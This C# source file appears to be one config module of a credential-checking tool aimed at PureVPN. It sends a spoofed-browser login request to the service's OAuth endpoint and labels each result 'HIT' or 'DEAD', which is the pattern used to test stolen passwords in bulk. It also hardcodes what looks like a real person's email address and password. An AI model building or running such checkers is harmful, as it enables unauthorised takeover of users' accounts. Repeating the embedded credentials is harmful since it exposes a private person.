using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Fox.Configs
{
    internal class PureVPN
    {
        public static void pure_vpn()
        {
            string email = "mohamedsamy92@hotmail.com";
            string pass = "0102611655Bandm";
            using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
            {
                req.IgnoreProtocolErrors = true;
      
                req.AddHeader("Host", "auth.purevpn.com");
                req.AddHeader("Connection", "keep-alive");
                req.AddHeader("Content-Type", "application/x-www-form-urlencoded");
                req.AddHeader("Cache-Control", "max-age=0");
                req.AddHeader("sec-ch-ua", "\"Chromium\";v=\"112\", \"Microsoft Edge\";v=\"112\", \"Not:A-Brand\";v=\"99\", \"Microsoft Edge WebView2\";v=\"112\"");
                req.AddHeader("sec-ch-ua-mobile", "?0");
                req.AddHeader("sec-ch-ua-platform", "\"Windows\"");
                req.AddHeader("Upgrade-Insecure-Requests", "1");
                req.AddHeader("Origin", "https://d11nlh9luc38sm.cloudfront.net");
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48";
                req.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
                req.AddHeader("Sec-Fetch-Site", "same-origin");
                req.AddHeader("Sec-Fetch-Mode", "navigate");
                req.AddHeader("Sec-Fetch-User", "?1");
                req.AddHeader("Sec-Fetch-Dest", "document");
                req.Referer = " https://d11nlh9luc38sm.cloudfront.net/";
                req.AddHeader("Accept-Language", "en-US,en;q=0.9");
                req.AddHeader("Accept-Encoding", "gzip, deflate");
              
                string payload = "captcha_token=&client_id=2e670c11-7775-4be8-b9d7-3e11d31eb53b&code_challenge=_uWTeLWM3D24cP8z-9d3vP2Kv67kbX80Tv6TOVOUeaM&code_challenge_method=S256&metaData.device.name=Windows+Chrome&metaData.device.type=BROWSER&nonce=&pendingIdPLinkId=&redirect_uri=https%3A%2F%2Fd9d2xy38i5m2k.cloudfront.net%2Fcallbacks%2Fwindows-in-app&response_mode=&response_type=code&scope=offline_access&state=25CA073EC298&tenantId=9707f41e-21a4-bbc5-dcbc-fdf6b61cc68f&timezone=Africa%2FCairo&user_code=&showPasswordField=true&loginId=" + email +"&password=" + pass;
                string send_data = req.Post("https://auth.purevpn.com/oauth2/authorize", payload, "application/x-www-form-urlencoded").ToString();
                if (send_data.Contains("isSuccess: true,") | send_data.Contains("You have been logged out of PureVPN."))
                {
                    Console.WriteLine("HIT");

                }
                else if (send_data.Contains("Invalid login credentials.") | send_data.Contains("Please enter a valid password"))
                {
                    Console.WriteLine("DEAD");

                }
                else
                { 
                //retry
                }    
                Console.Write(send_data);
            }


        }
    }
}
